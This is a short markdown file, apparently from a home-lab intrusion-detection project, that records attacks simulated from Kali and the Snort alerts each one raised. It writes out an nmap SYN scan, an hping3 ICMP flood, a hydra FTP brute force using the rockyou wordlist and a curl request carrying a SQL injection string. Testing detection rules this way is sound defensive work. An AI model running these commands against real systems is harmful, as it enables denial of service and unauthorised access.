
---

## 🧪 `docs/attack_simulations.md`

```markdown
# ⚔️ Attack Simulations

This file documents how each attack was simulated from Kali and how Snort detected it on Ubuntu.

---

### 🔍 Port Scan (Nmap)

**Tool:** Nmap  
**Command:**
```bash
nmap -sS 192.168.x.x

[**] [1000001] [ALERT] Port scan detected [**]

hping3 -1 --flood 192.168.x.x

[**] [1000002] [ALERT] ICMP Flood [**]


hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.x.x -t 4

[**] [1000005] [ALERT] FTP brute force detected [**]


curl "http://192.168.x.x/mutillidae/index.php?page=dns-lookup.php&id='%20or%201=1--"

[**] [1000004] [ALERT] SQL Injection attempt [**]

